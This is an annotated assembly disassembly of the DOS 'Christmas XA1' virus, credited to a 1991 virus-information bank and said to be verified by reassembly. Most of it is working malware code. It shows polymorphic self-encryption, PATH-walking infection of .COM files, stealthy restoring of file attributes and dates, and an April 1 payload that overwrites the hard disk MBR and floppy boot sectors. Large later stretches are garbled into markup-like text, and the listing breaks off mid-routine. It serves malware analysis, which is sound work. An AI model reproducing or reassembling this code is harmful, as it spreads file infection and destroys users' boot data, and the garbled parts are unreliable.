

;========================================================;
;                Virus "Christmas XA1"                   ;
;        dissasembly of memory resident virus            ;
;          (or file virus after encryption)              ;
;                                                        ;
;        dissasembled: Marek Sell, July 1991             ;
;     dissassembly veryfied by MASM reassemblation       ;
;                                                        ;
;     (C) Polish Section of Virus Information Bank       ;
;--------------------------------------------------------;

cseg          segment
      assume cs:cseg, ds:cseg, es:cseg, ss:cseg
      org    100h

L0100:        JMP    short L0109            ;0100 EB07

      DB     56H,0AH,3,59H,0        ;contamination ptr             ;0102 56 0A 03 59 00

L0107         dw     2AH          ;contamined files countr;0107 2A 00

L0109:        PUSH   CS                     ;0109 0E
      CALL   L010D                  ;010A E80000
L010D:        CLI                                                                ;010D FA
      MOV    BP,SP                                                       ;010E 8BEC
      POP    AX                                                        ;010D  ;0110 58
      XOR    AL,AL                                                       ;0111 32C0
      MOV    [BP+2],AX                                             ;100h to stack ;0113 894602
      ADD    WORD PTR [BP+0],offset L0135-offset L010D ;10Dh+28h=135h  ;0116 8146002800

      MOV    CX,05CEh                                                   ;011B B9CE05
      MOV    AL,8Ch                                                      ;011E B08C
L011F         equ    $-1                                                       ;byte = encryption key

      MOV    [BP-1],AL                                                  ;0120 8846FF
      MOV    BX,[BP+0]                                             ;0135  ;0123 8B5E00
L0124         equ    $-2                                                       
      ;mov   bx,[bp+0] (8B 5E 00)   ;var 1, 2, 3
      ;mov   si,[bp+0] (8B 76 00)   ;var 4, 5, 6
      ;mov   di,[bp+0] (8B 7E 00)   ;var 7, 8, 9

L0126:        MOV    [BP-2],CL                                                  ;0126 884EFE
      MOV    CL,[BP-1]                                             ;08Ch  ;0129 8A4EFF
L012C:        ROL    BYTE PTR [BX],CL       ;00Fh ->0F0h                   ;012C D207
      ;add   byte ptr [bx],cl (00 0F)                              ;var 1
      ;xor   byte ptr [bx],cl (30 0F)                              ;var 2
      ;rol   byte ptr [bx],cl (D2 07)                              ;var 3
      ;add   byte ptr [si],cl (00 0C)                              ;var 4
      ;xor   byte ptr [si],cl (30 0C)                              ;var 5
      ;rol   byte ptr [si],cl (D2 04)                              ;var 6
      ;add   byte ptr [di],cl (00 0D)                              ;var 7
      ;xor   byte ptr [di],cl (30 0D)                              ;var 8
      ;rol   byte ptr [di],cl (D2 05)                              ;var 9

      JMP    short L0130                                           ;flush prefetch ;012E EB00

L0130:        INC    BX                                                          ;0130 43
      ;inc   bx (43)                                               ;var 1, 2, 3
      ;inc   si (46)                                               ;var 4, 5, 6
      ;inc   di (47)                                               ;var 7, 8, 9

      MOV    CL,[BP-02]                                            ;CEh  ;0131 8A4EFE
      LOOP   L0126                                                       ;0134 E2F0
;---------------^^
;this byte is encoded too

L0135         equ    $-1                    ;begin of encoded area

;===========================================================
;             Encoded part of virus
;-----------------------------------------------------------
      STI                                                                ;0136 FB
      MOV    AH,2Fh                                                ;get DTA  ;0137 B42F
      INT    21h                                                         ;0139 CD21
      PUSH   ES                                                    ;DTA segment  ;013B 06
      PUSH   BX                                                    ;DTA offset  ;013C 53
      XOR    AX,AX                                                       ;013D 33C0
      MOV    DS,AX                                                       ;013F 8ED8
      MOV    AL,ds:[0417h]          ;shift status                      ;0141 A01704
      AND    AL,10h                                                ;Scroll Lock  ;0144 2410
      PUSH   AX                                                          ;0146 50
      AND    BYTE PTR ds:[0417h],0EFh;-Scroll Lock                 ;0147 80261704EF
      MOV    AX,CS                                                       ;014C 8CC8
      MOV    DS,AX                                                       ;014E 8ED8
      MOV    DX,offset L06C6        ;new int 24h                       ;0150 BAC606
      MOV    AX,2524h               ;Set int 24h                       ;0153 B82425
      INT    21h                                                         ;0156 CD21
      MOV    AX,ds:[002Ch]          ;environment segment           ;0158 A12C00
      MOV    ES,AX                                                       ;015B 8EC0
      XOR    DI,DI                                                 ;in environment offset ;015D 33FF
      CLD                                                                ;015F FC
L0160:        CMP    BYTE PTR es:[DI],00                                       ;0160 26803D00
      JZ     L0183                                                 ;-> end of environment ;0164 741D
      MOV    SI,offset L051B        ;'PATH='                           ;0166 BE1B05
      MOV    CX,0005                                                     ;0169 B90500
      MOV    AX,DI                                                       ;016C 8BC7
      REPZ   CMPSB                                                       ;016E F3 A6
      JZ     L0183                                                 ;-> found  ;0170 7411

   ;<- find="" end="" of="" current="" environment="" value="" mov="" di,ax="" ;0172="" 8bf8="" xor="" al,al="" ;0174="" 32c0="" mov="" ch,0ffh="" ;0176="" b5ff="" repnz="" scasb="" ;0178="" f2="" ae="" jz="" l0160="" ;-=""> found  ;017A 74E4

      MOV    DI,offset L051A        ;db 0                               ;017C BF1A05
      MOV    AX,CS                                                       ;017F 8CC8
      MOV    ES,AX                                                       ;0181 8EC0

L0183:        MOV    WORD PTR [L05C1],offset L0562                             ;0183 C706C1056205
      MOV    DX,offset L0536        ;new DTA address               ;0189 BA3605
      MOV    AH,1Ah                                                ;set DTA ds:dx  ;018C B41A
      INT    21h                                                         ;018E CD21

      MOV    AX,[L06F9]                                                 ;0190 A1F906
      MOV    [L06F7],AX                                                 ;0193 A3F706
      MOV    AX,[L06FD]                                                 ;0196 A1FD06
      MOV    [L06FB],AX                                                 ;0199 A3FB06
      MOV    CX,0005                                                     ;019C B90500
      MOV    DX,offset L0515        ;*.com                              ;019F BA1505
      PUSH   ES                                                          ;01A2 06
      PUSH   DI                                                          ;01A3 57
      PUSH   CX                                                          ;01A4 51

L01A5:        MOV    AX,CS                                                       ;01A5 8CC8
      MOV    ES,AX                                                       ;01A7 8EC0
      MOV    CX,0FFFFh                                                  ;01A9 B9FFFF
      MOV    AH,4Eh                                                ;Find First  ;01AC B44E
      JMP    short L01B6                                                ;01AE EB06

L01B0:        POP    CX                                                          ;01B0 59
      JCXZ   L020E                                                 ;-> enought contamined ;01B1 E35B
      MOV    AH,4Fh                                                ;Find next  ;01B3 B44F
      PUSH   CX                                                          ;01B5 51
L01B6:        INT    21h                                                         ;01B6 CD21
      JB     L01BD                                                 ;-> error  ;01B8 7203
      JMP    L02AE                                                 ;-> file match  ;01BA E9F100

L01BD:        POP    CX                                                    ;init to 5  ;01BD 59
      POP    DI                                                    ;path value address ;01BE 5F
      POP    ES                                                    ;path segment  ;01BF 07

L01C0:        CMP    BYTE PTR ES:[DI],00                                       ;01C0 26 803D00
      JZ     L0210                                                 ;-> end of path  ;01C4 744A
      MOV    BX,offset L0562        ;curent path                       ;01C6 BB6205

L01C9:        MOV    AL,ES:[DI]             ;byte from 'PATH'              ;01C9 26 8A 05
      OR     AL,AL                                                       ;01CC 0AC0
      JZ     L01DA                                                 ;-> End of env. value ;01CE 740A
      INC    DI                                                          ;01D0 47
      CMP    AL,3Bh                                                ;';' End of directory ;01D1 3C3B
      JZ     L01DA                                                 ;->yes   ;01D3 7405
      MOV    [BX],AL                                               ;store byte in cur path ;01D5 8807
      INC    BX                                                          ;01D7 43
      JMP    L01C9                                                 ;-> next char  ;01D8 EBEF

L01DA:        CMP    BX,offset L0562        ;no char stored                ?   ;01DA 81FB6205
      JZ     L01C0                                                 ;-> yes   ;01DE 74E0
      MOV    AL,[BX-1]              ;last char                         ;01E0 8A47FF
      CMP    AL,3Ah                                                ;':'   ;01E3 3C3A
      JZ     L01EF                                                 ;-> yes   ;01E5 7408
      CMP    AL,5Ch                                                ;'\'   ;01E7 3C5C
      JZ     L01EF                                                 ;-> yes   ;01E9 7404
      MOV    BYTE PTR [BX],'\'                                         ;01EB C6075C
      INC    BX                                                          ;01EE 43

L01EF:        PUSH   ES                                                    ;environment segment ;01EF 06
      PUSH   DI                                                    ;in environment offset ;01F0 57
      PUSH   CX                                                          ;01F1 51
      MOV    [L05C1],BX             ;End of directory path         ;01F2 891EC105
      MOV    SI,BX                                                       ;01F6 8BF3
      SUB    BX,offset L0562        ;                                   ;01F8 81EB6205
      MOV    CX,BX                                                 ;length of dir name ;01FC 8BCB
      MOV    DI,offset L0514        ;'\*.COM',0                        ;01FE BF1405
      MOV    AX,CS                                                       ;0201 8CC8
      MOV    ES,AX                                                       ;0203 8EC0
      DEC    SI                                                          ;0205 4E
      STD                                                          ;direction down  ;0206 FD
      REPZ   MOVSB                                                       ;0207 F3 A4
      MOV    DX,DI                                                       ;0209 8BD7
      INC    DX                                                    ;first char of filename ;020B 42
      JMP    L01A5                                                       ;020C EB97

   ;<- 5="" contamined="" files="" l020e:="" pop="" ax="" ;020e="" 58="" pop="" ax="" ;020f="" 58=""></-><- end="" of="" path="" (no="" more="" files)="" l0210:="" mov="" ax,cs="" ;0210="" 8cc8="" mov="" es,ax="" ;0212="" 8ec0="" mov="" ah,2ah="" ;get="" system="" date="" ;0214="" b42a="" int="" 21h="" ;0216="" cd21="" cmp="" dx,0401h="" ;1="" april="" ;0218="" 81fa0104="" jnz="" l0251="" ;-=""> no   ;021C 7533
      MOV    DX,0080h               ;head 0,  1 st HDD             ;021E BA8000
      MOV    CX,0001                                               ;track 0, sector 1 ;0221 B90100
      MOV    BX,0703h               ;disk buffer                       ;0224 BB0307
      MOV    AX,0201h               ;read 1 sector                     ;0227 B80102
      PUSH   DX                                                          ;022A 52
      PUSH   CX                                                          ;022B 51
      PUSH   BX                                                          ;022C 53
      INT    13h                                                         ;022D CD13
      POP    BX                                                          ;022F 5B
      POP    CX                                                          ;0230 59
      POP    DX                                                          ;0231 5A
      MOV    CL,11h                                                ;track 0, sector 17 ;0232 B111
      MOV    AX,0301h               ;write 1 sector                    ;0234 B80103
      INT    13h                                                   ;save MBR  ;0237 CD13
      MOV    WORD PTR [L0637+200h-2],0AA55h                            ;0239 C706350855AA
      MOV    DL,80h                                                ;head 0, 1st HDD ;023F B280
      CALL   L06B8                                                 ;change MBR  ;0241 E87404
      XOR    DL,DL                                                 ;head 0, 1st FDD ;0244 32D2
      CALL   L06B8                                                 ;change boot-sector ;0246 E86F04
      MOV    DL,01                                                 ;head 0, 2nd FDD ;0249 B201
      CALL   L06B8                                                 ;change boot-sector ;024B E86A04
      JMP    short L025A            ;-> O.K.                           ;024E EB0A
      NOP                                                                ;0250 90

L0251:        CMP    DX,0C18h               ;24 december                       ;0251 81FA180C
      JB     L025A                                                 ;-> bellow  ;0255 7203
      CALL   L05D7                  ;Display Christmas Tree            ;0257 E87D03

L025A:        IN     AL,40h                                                      ;025A E440
      CMP    AL,0F8h                                                     ;025C 3CF8
      JB     L0266                                                       ;025E 7206
      IN     AL,61h                                                      ;0260 E461
      OR     AL,03                                                 ;Speaker on  ;0262 0C03
      OUT    61h,AL                                                      ;0264 E661

L0266:        XOR    AX,AX                                                       ;0266 33C0
      MOV    DS,AX                                                       ;0268 8ED8
      POP    AX                                                    ;Scroll Lock state ;026A 58
      OR     ds:[0417h],AL                                              ;026B 08061704
      MOV    DS,cs:[0014h]          ;int 24h vector                    ;026F 2E8E1E1400
      MOV    DX,cs:[0012h]                                              ;0274 2E8B161200
      MOV    AX,2524h               ;set int 24h vector            ;0279 B82425
      INT    21h                                                         ;027C CD21
      POP    DX                                                    ;oryginal DTA seg/offs ;027E 5A
      POP    DS                                                          ;027F 1F
      MOV    AH,1Ah                                                ;set DTA address ;0280 B41A
      INT    21h                                                         ;0282 CD21
      MOV    AX,CS                                                       ;0284 8CC8
      MOV    DS,AX                                                       ;0286 8ED8
      MOV    SI,offset L06F0        ;code to restore victim        ;0288 BEF006
      MOV    DI,[L06F7]             ;victim length+100h            ;028B 8B3EF706
      ADD    DI,[L06FB]             ;virus length                      ;028F 033EFB06
      PUSH   DI                                                    ;end of program  ;0293 57
      MOV    CX,0007                                               ;code length  ;0294 B90700
      CLD                                                                ;0297 FC
      REPZ   MOVSB                                                       ;0298 F3 A4
      XOR    AX,AX                                                 ;reset registers ;029A 33C0
      MOV    BX,AX                                                       ;029C 8BD8
      MOV    DX,AX                                                       ;029E 8BD0
      MOV    BP,AX                                                       ;02A0 8BE8
      MOV    SI,[L06F7]             ;victim length+100h            ;02A2 8B36F706
      MOV    DI,0100h               ;place for oryginal byte;02A6 BF0001
      MOV    CX,[L06FB]             ;virus length                      ;02A9 8B0EFB06
      RET                                                                ;02AD C3

     ;<- founded="" next="" victim="" l02ae:="" mov="" si,offset="" l0554="" ;founded="" file="" name="" ;02ae="" be5405="" mov="" di,[l05c1]="" ;end="" of="" directory="" path="" ;02b1="" 8b3ec105="" mov="" cx,000dh="" ;name="" length="" ;02b5="" b90d00="" cld="" ;02b8="" fc="" repz="" movsb="" ;02b9="" f3="" a4="" mov="" di,offset="" l0520="" ;'ibmbio.com'="" ;02bb="" bf2005="" call="" l04bb="" ;compare="" current="" file="" ;02be="" e8fa01="" jnz="" l02c6="" ;-=""> not equal  ;02C1 7503
      JMP    L01B0                                                 ;-> find next file ;02C3 E9EAFE

L02C6:        MOV    DI,offset L052B        ;'IBMDOS.COM'                      ;02C6 BF2B05
      CALL   L04BB                                                 ;compare current file ;02C9 E8EF01
      JNZ    L02D1                                                 ;-> not the same ;02CC 7503
      JMP    L01B0                                                 ;-> find next file ;02CE E9DFFE

L02D1:        MOV    BYTE PTR [L0561],00    ;no attr change                ;02D1 C606610500
      NOP                                                                ;02D6 90
      TEST   BYTE PTR [L054B],07    ;file attribute                ;02D7 F6064B0507
      JZ     L02ED                                                 ;-> not set  ;02DC 740F

      MOV    DX,offset L0562        ;file name & path              ;02DE BA6205
      XOR    CX,CX                                                 ;new attribute  ;02E1 33C9
      MOV    AX,4301h               ;set file attribute            ;02E3 B80143
      INT    21h                                                         ;02E6 CD21
      JAE    L02ED                                                 ;-> no error  ;02E8 7303
      JMP    L01B0                                                 ;-> error, find next ;02EA E9C3FE

L02ED:        MOV    DX,offset L0562        ;file name & path              ;02ED BA6205
      MOV    AX,3D02h               ;open file R/W                     ;02F0 B8023D
      INT    21h                                                         ;02F3 CD21
      MOV    BX,AX                                                 ;file handle  ;02F5 8BD8
      JAE    L02FC                                                 ;-> O.K.  ;02F7 7303
      JMP    L01B0                                                 ;-> error, find next ;02F9 E9B4FE

L02FC:        MOV    AX,[L0552]             ;file size high                    ;02FC A15205
      OR     AX,AX                                                       ;02FF 0BC0
      JZ     L0306                                                 ;-> O.K.  ;0301 7403
L0303:        JMP    L0496                                                 ;-> file to big, next ;0303 E99001

L0306:        MOV    AX,[L0550]             ;file size low                     ;0306 A15005
      CMP    AX,0007                                                     ;0309 3D0700
      JB     L0303                                                 ;-> file to small ;030C 72F5
      CMP    AX,0F800h                                                  ;030E 3D00F8
      JAE    L0303                                                 ;-> file to big  ;0311 73F0
      MOV    DX,[L06F7]             ;current file length           ;0313 8B16F706
      ADD    DX,[L06FB]             ;virus length                      ;0317 0316FB06
      MOV    CX,0007                                               ;bytes to read  ;031B B90700
      PUSH   DX                                                          ;031E 52
      PUSH   CX                                                          ;031F 51
      MOV    AH,3Fh                                                ;read handle  ;0320 B43F
      INT    21h                                                         ;0322 CD21
      POP    CX                                                          ;0324 59
      POP    SI                                                          ;0325 5E
      JB     L0330                                                 ;-> error, next file ;0326 7208
      MOV    DI,0100h                                                   ;0328 BF0001
      CLD                                                                ;032B FC
      REPZ   CMPSB                                                       ;032C F3 A6
      JNZ    L0333                                                 ;-> not contamined yet ;032E 7503
L0330:        JMP    L0496                                                       ;0330 E96301

L0333:        MOV    AX,5700h               ;get file date & time          ;0333 B80057
      INT    21h                                                         ;0336 CD21
      JB     L0330                                                 ;-> error, get next ;0338 72F6
      MOV    [L0701],DX             ;victim date                       ;033A 89160107
      MOV    [L06FF],CX             ;victim time                       ;033E 890EFF06
      MOV    BYTE PTR [L0561],1     ;attr chng ptr                 ;0342 C606610501
      NOP                                                                ;0347 90
      MOV    AX,[L0550]             ;file size low                     ;0348 A15005
      CMP    AX,0603h               ;virus length                      ;034B 3D0306
      JAE    L0371                                                 ;-> file bigger then vir;034E 7321
      XOR    DX,DX                                                       ;0350 33D2
      XOR    CX,CX                                                       ;0352 33C9
      MOV    AX,4202h               ;set file ptr EOF+0            ;0354 B80242
      INT    21h                                                         ;0357 CD21
      JAE    L035E                                                 ;-> no error  ;0359 7303
      JMP    L0496                                                 ;-> error, get next ;035B E93801

L035E:        MOV    CX,0603h               ;virus length                      ;035E B90306
      SUB    CX,[L0550]             ;- file length                     ;0361 2B0E5005
      MOV    AH,40h                                                ;write handle  ;0365 B440
      INT    21h                                                         ;0367 CD21
      MOV    AX,0603h               ;new file length               ;0369 B80306
      JAE    L0371                                                 ;-> no error  ;036C 7303
      JMP    L0496                                                 ;-> error, get next ;036E E92501

L0371:        INC    AH                                                    ;+100h (PSP length) ;0371 FEC4
      MOV    [L06F9],AX             ;victim length + 100h          ;0373 A3F906
      MOV    AX,[L0550]             ;real file length              ;0376 A15005
      MOV    SI,0603h               ;virus length                      ;0379 BE0306
      XOR    DI,DI                                                       ;037C 33FF
      CMP    AX,SI                                                       ;037E 3BC6
      JAE    L0384                                                       ;0380 7302
      MOV    SI,AX                                                       ;0382 8BF0
L0384:        MOV    [L06FD],SI                                                 ;0384 8936FD06
L0388:        MOV    DX,DI                                                       ;0388 8BD7
      XOR    CX,CX                                                       ;038A 33C9
      MOV    AX,4200h               ;set file ptr                      ;038C B80042
      INT    21h                                                         ;038F CD21
      JAE    L0396                                                 ;-> O.K.  ;0391 7303
      JMP    L0496                                                 ;-> error, get next ;0393 E90001

L0396:        MOV    DX,[L06F7]             ;program end                       ;0396 8B16F706
      ADD    DX,[L06FB]             ;virus length                      ;039A 0316FB06
      MOV    CX,0200h               ;part to read length           ;039E B90002
      CMP    SI,CX                                                       ;03A1 3BF1
      JAE    L03A7                                                       ;03A3 7302
      MOV    CX,SI                                                       ;03A5 8BCE
L03A7:        PUSH   DX                                                          ;03A7 52
      PUSH   CX                                                          ;03A8 51
      MOV    AH,3Fh                                                ;read handle  ;03A9 B43F
      INT    21h                                                         ;03AB CD21
      POP    CX                                                          ;03AD 59
      POP    DX                                                          ;03AE 5A
      JAE    L03B4                                                 ;-> O.K.  ;03AF 7303
      JMP    L0496                                                 ;-> error, get next ;03B1 E9E200

L03B4:        PUSH   DX                                                          ;03B4 52
      PUSH   CX                                                          ;03B5 51
      XOR    DX,DX                                                       ;03B6 33D2
      XOR    CX,CX                                                       ;03B8 33C9
      MOV    AX,4202h               ;set file ptr EOF+0            ;03BA B80242
      INT    21h                                                         ;03BD CD21
      POP    CX                                                          ;03BF 59
      POP    DX                                                          ;03C0 5A
      JAE    L03C6                                                 ;-> O.K.  ;03C1 7303
      JMP    L0496                                                 ;-> error, get next ;03C3 E9D000

L03C6:        MOV    AH,40h                                                ;write handle  ;03C6 B440
      INT    21h                                                         ;03C8 CD21
      JAE    L03CF                                                 ;-> O.K.  ;03CA 7303
      JMP    L0496                                                 ;error, get next ;03CC E9C700

L03CF:        ADD    DI,0200h               ;begin of file ptr             ;03CF 81C70002
      SUB    SI,0200h               ;bytes left                        ;03D3 81EE0002
      JBE    L03DB                                                 ;-> ready  ;03D7 7602
      JMP    L0388                                                 ;-> rewrite next ;03D9 EBAD

L03DB:        INC    WORD PTR [L0107]                                          ;03DB FF060701
      XOR    DX,DX                                                       ;03DF 33D2
      XOR    CX,CX                                                       ;03E1 33C9
      MOV    AX,4200h               ;Set file ptr BOF+0            ;03E3 B80042
      INT    21h                                                         ;03E6 CD21
      JAE    L03ED                                                 ;-> O.K.  ;03E8 7303
      JMP    L0496                                                 ;-> error, get next ;03EA E9A900

L03ED:        PUSH   BX                    ; file handle  ;03ED 53
L03EE:        IN     AL,40h                ; 03EE E440
      TEST   AL,07h                        ; 03F0 A807
      JZ     L03EE                         ; 03F2 74FA
      MOV    byte ptr [L011F],AL ;new encription key               ;03F4 A21F01
      XOR    AX,AX                                                       ;03F7 33C0
      MOV    BH,AL                                                       ;03F9 8AF8
      MOV    DS,AX                                                       ;03FB 8ED8
      MOV    AL,ds:[046Ch]          ;system timer low byte         ;03FD A06C04
      MOV    DX,CS                        ;0400 8CCA
      MOV    DS,DX                        ;0402 8EDA
      MOV    CL,03                        ;0404 B103
      DIV    CL                           ;0406 F6F1
      MOV    CH,AH                  ;reminder  ;0408 8AEC
      XOR    AH,AH                              ;040A 32E4
      DIV    CL                                 ;040C F6F1
      MOV    AL,AH                  ;reminder  ;040E 8AC4
      ADD    AL,AL                  ;*2   ;0410 02C0
      ADD    AL,AH                  ;*3   ;0412 02C4
      ADD    AL,CH                  ;first reminder  ;0414 02C5
      MOV    BL,AL                  ;0 - 8   ;0416 8AD8
      ADD    BX,BX                  ;* 2   ;0418 03DB
      ADD    BX,BX                  ;* 4   ;041A 03DB
      ADD    BX,offset L06C9                                            ;041C 81C3C906
      MOV    AL,[BX]                ;5Eh/76h/7Eh  ;0420 8A07
      MOV    byte ptr [L0124],AL                                       ;0422 A22401
      MOV    AX,[BX+01]             ;0F00/0F30/07D2...             ;0425 8B4701
      MOV    word ptr [L012C],AX                                       ;0428 A32C01
      MOV    AL,[BX+03]             ;43h/46h/47h                       ;042B 8A4703
      MOV    byte ptr [L0130],AL                                       ;042E A23001
      MOV    AL,CH                  ;first reminder  ;0431 8AC5
      MOV    BX,offset L06ED                                            ;0433 BBED06
      XLAT                                                               ;0436 D7
      MOV    byte ptr [L0461],AL    ;28h/30h/D2h                   ;0437 A26104
      POP    BX                                                          ;043A 5B
      MOV    DX,0100h               ;encoding procedure            ;043B BA0001
      MOV    CX,0035h               ;procedure length              ;043E B93500
      MOV    AH,40h                 ;write handle  ;0441 B440
      INT    21h                                                         ;0443 CD21
      JB     L0496                              ;-> error, get next ;0445 724F
      MOV    SI,offset L0135                                            ;0447 BE3501
      MOV    CX,05CEh               ;603h-100h-35h                     ;044A B9CE05
L044D:        PUSH   BX                                                          ;044D 53
      PUSH   CX                                                          ;044E 51
      MOV    AX,0200h                                                   ;044F B80002
      MOV    BX,[L06F7]             ;count buffer address          ;0452 8B1EF706
      ADD    BX,[L06FB]                                                 ;0456 031EFB06
      PUSH   BX                                                          ;045A 53
      MOV    CL,byte ptr [L011F]    ;encription key                ;045B 8A0E1F01
L045F:
      MOV    CH,[SI]                                                     ;045F 8A2C

L0461:
      ROR    CH,CL                                                       ;0461 D2CD
      ;sub   ch,cl (28 CD)          ;var 1, 4, 7
      ;xor   ch,cl (30 CD)          ;var 2, 5, 8
      ;ror   ch,cl (D2 CD)          ;var 3, 6, 9

      MOV    [BX],CH                                                     ;0463 882F
      INC    BX                                                          ;0465 43
      INC    SI                                                          ;0466 46
      DEC    AX                                                          ;0467 48
      JNZ    L045F                          ; encription loop ;0468 75F5
      POP    DX                                                          ;046A 5A
      POP    CX                                                          ;046B 59
      POP    BX                                                          ;046C 5B
      PUSH   CX                                                          ;046D 51
      CMP    CX,0201h                                                   ;046E 81F90102
      JB     L0477                  ; last virus part ;0472 7203
      MOV    CX,0200h               ;bytes to write                    ;0474 B90002
L0477:
      MOV    AH,40h                 ; write handle  ;0477 B440
      INT    21h                                                         ;0479 CD21
      POP    CX                                                          ;047B 59
      JB     L0496                  ; error, get next ;047C 7218
      SUB    CX,0200h               ; - portion length             ;047E 81E90002
      JA     L044D                  ; not all written yet ;0482 77C9

      MOV    DX,[L0701]             ;saved file date               ;0484 8B160107
      MOV    CX,[L06FF]             ;saved file time               ;0488 8B0EFF06
      MOV    AX,5701h               ;set file date/time            ;048C B80157
      INT    21h                                                         ;048F CD21
      JB     L0496                                                 ;-> error, exit  ;0491 7203
      POP    CX                                                          ;0493 59
      DEC    CX                                                          ;0494 49
      PUSH   CX                                                          ;0495 51

    ;<- exit="" l0496:="" mov="" ah,3eh="" ;close="" handle="" ;0496="" b43e="" int="" 21h="" ;0498="" cd21="" mov="" cl,[l054b]="" ;file="" attribute="" ;049a="" 8a0e4b05="" dec="" byte="" ptr="" [l0561];attr="" change="" ptr="" ;049e="" fe0e6105="" jz="" l04a9="" ;-=""> changed  ;04A2 7405
      TEST   CL,07                                                       ;04A4 F6C107
      JZ     L04B8                                                 ;-> no attributes set ;04A7 740F

    ;<- restore="" attributes="" l04a9:="" cmp="" cl,20h="" ;r/o="" ;04a9="" 80f920="" jz="" l04b8="" ;-=""> yes   ;04AC 740A
      MOV    DX,offset L0562        ;file name & path              ;04AE BA6205
      XOR    CH,CH                                                       ;04B1 32ED
      MOV    AX,4301h               ;set file attribute            ;04B3 B80143
      INT    21h                                                         ;04B6 CD21
L04B8:        JMP    L01B0                                                 ;-> next file  ;04B8 E9F5FC

;========================================
;             Compare current file name with [DI]
;----------------------------------------
L04BB:        MOV    SI,offset L0562        ;current file name             ;04BB BE6205
      MOV    CX,000Bh               ;file name length              ;04BE B90B00
      CLD                                                                ;04C1 FC
      REPZ   CMPSB                                                       ;04C2 F3 A6
      RET                                                                ;04C4 C3

      ;<------file search="" path="" db="" '0123456789'="" ;04c5="" 30="" 31="" 32="" 33="" 34="" 35="" 36="" 37="" 38="" 39="" db="" '0123456789'="" ;04cf="" 30="" 31="" 32="" 33="" 34="" 35="" 36="" 37="" 38="" 39="" db="" '0123456789'="" ;04d9="" 30="" 31="" 32="" 33="" 34="" 35="" 36="" 37="" 38="" 39="" db="" '0123456789'="" ;04e3="" 30="" 31="" 32="" 33="" 34="" 35="" 36="" 37="" 38="" 39="" db="" '0123456789'="" ;04ed="" 30="" 31="" 32="" 33="" 34="" 35="" 36="" 37="" 38="" 39="" db="" '012345678'="" ;04f7="" 30="" 31="" 32="" 33="" 34="" 35="" 36="" 37="" 38="" db="" 'c:\jezyki'="" ;0500="" 43="" 3a="" 5c="" 4a="" 45="" 5a="" 59="" 4b="" 49="" db="" 'c:\pc'="" ;0509="" 43="" 3a="" 5c="" 50="" 43="" db="" 'd:\u'="" ;050e="" 44="" 3a="" 5c="" 55="" db="" 'c:'="" ;0512="" 43="" 3a="" l0514="" db="" '\'="" ;0514="" 5c="" l0515="" db="" '*.com'="" ;0515="" 2a="" 2e="" 43="" 4f="" 4d="" l051a="" db="" 0="" ;051a="" 00="" l051b="" db="" 'path='                                                     ;051B 50 41 54 48 3D

L0520         db     ' ibmbio.com',0="" ;0520="" 49="" 42="" 4d="" 42="" 49="" 4f="" 2e="" 43="" 4f="" ;0529="" 4d="" 00="" l052b="" db="" 'ibmdos.com',0="" ;052b="" 49="" 42="" 4d="" 44="" 4f="" 53="" 2e="" 43="" 4f="" ;0534="" 4d="" 00=""></------file><----- virus="" dta="" l0536="" db="" 3="" ;0536="" 03="" db="" '????????com'="" ;0537="" 3f="" 3f="" 3f="" 3f="" 3f="" 3f="" 3f="" 3f="" ;053f="" 43="" 4f="" 4d="" db="" 0ffh,2="" ;0542="" ff02="" db="" 0,0="" ;0544="" 0000="" db="" 0,0="" ;0546="" 0000="" db="" 0,0="" ;0548="" 0000="" db="" 0="" ;054a="" 00="" l054b="" db="" 20h="" ;attribute="" found="" ;054b="" 20="" db="" 00,60h="" ;time="" file="" was="" last="" wrt="" ;054c="" 00="" 60="" db="" 71h,0eh="" ;date="" file="" was="" last="" wrt="" ;054e="" 71="" 0e="" l0550="" dw="" 62dbh="" ;file="" size="" low="" ;0550="" db="" 62="" l0552="" dw="" 0="" ;file="" size="" high="" ;0552="" 00="" 00="" l0554="" db="" 'command.com',0="" ;0554="" 43="" 4f="" 4d="" 4d="" 41="" 4e="" ;055a="" 44="" 2e="" 43="" 4f="" 4d="" 00="" db="" 0="" ;???="" ;0560="" 00="" l0561="" db="" 1="" ;attr="" change="" ptr="" ;0561="" 01="" l0562="" db="" 'c:\command.com',0,0="" ;0562="" 43="" 3a="" 5c="" 43="" 4f="" 4d="" ;0568="" 4d="" 41="" 4e="" 44="" 2e="" 43="" ;056e="" 4f="" 4d="" 00="" 00="" db="" 'm',0,0,0="" ;0572="" 4d="" 00="" 00="" 00="" db="" '.com',0="" ;0576="" 2e="" 43="" 4f="" 4d="" 00="" db="" 'ohno!'="" ;057b="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;0580="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;0585="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;058a="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;058f="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;0594="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;0599="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;059e="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;05a3="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;05a8="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;05ad="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;05b2="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;05b7="" 4f="" 68="" 4e="" 6f="" 21="" db="" 'ohno!'="" ;05bc="" 4f="" 68="" 4e="" 6f="" 21="" l05c1="" dw="" 0565h="" ;end="" of="" directory="" path="" ;05c1="" 65="" 05="" ;="=======================================" ;="" write="" [cx]="" spaces="" ;----------------------------------------="" l05c3:="" mov="" al,20h="" ;05c3="" b020="" l05c5:="" push="" ax="" ;05c5="" 50="" call="" l0667="" ;write="" as="" tty="" ;05c6="" e89e00="" pop="" ax="" ;05c9="" 58="" loop="" l05c5="" ;05ca="" e2f9="" ret="" ;05cc="" c3="" ;="=======================================" ;="" write="" cr/lf="" ;----------------------------------------="" l05cd:="" mov="" al,0dh="" ;cr="" ;05cd="" b00d="" call="" l0667="" ;write="" as="" tty="" ;05cf="" e89500="" mov="" al,0ah="" ;lf="" ;05d2="" b00a="" jmp="" l0667="" ;write="" as="" tty="" ;05d4="" e99000="" ;="===============================================" ;="" display="" christmas="" tree="" ;------------------------------------------------="" l05d7:="" mov="" cx,0027h="" ;05d7="" b92700="" call="" l05c3="" ;write="" [cx]="" spaces="" ;05da="" e8e6ff="" 